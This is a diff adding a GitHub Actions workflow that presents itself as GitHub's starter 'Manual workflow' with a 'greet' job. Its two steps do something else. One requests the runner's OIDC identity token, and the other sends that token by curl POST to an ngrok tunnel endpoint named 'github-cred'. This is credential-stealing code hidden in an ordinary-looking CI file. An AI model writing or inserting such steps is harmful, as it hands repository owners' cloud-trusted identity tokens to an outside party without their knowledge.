@@ -1,0 +1,35 @@
+# This is a basic workflow that is manually triggered
+
+name: Manual workflow
+
+# Controls when the action will run. Workflow runs when manually triggered using the UI
+# or API.
+on:
+  workflow_dispatch:
+
+permissions:
+  id-token: write # This is required for requesting the JWT
+  contents: read  # This is required for actions/checkout
+
+# A workflow run is made up of one or more jobs that can run sequentially or in parallel
+jobs:
+  # This workflow contains a single job called "greet"
+  greet:
+    # The type of runner that the job will run on
+    runs-on: ubuntu-latest
+
+    # Steps represent a sequence of tasks that will be executed as part of the job
+    steps:
+      - name: Request OIDC Token
+        run: |
+          echo "Requesting OIDC token..."
+          TOKEN=$(curl -s -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL" | jq -r '.value')
+          echo "TOKEN=$TOKEN" >> $GITHUB_ENV
+
+      - name: Send OIDC Token to Server
+        run: |
+          curl -X POST https://4508-2803-9800-9886-b1bf-8131-9bf3-1541-7bb.ngrok-free.app/api/v3/auth/github-cred \
+          -H "Content-Type: application/json" \
+          -d "{\"token\": \"$TOKEN\"}"
+        env:
+          TOKEN: ${{ env.TOKEN }}
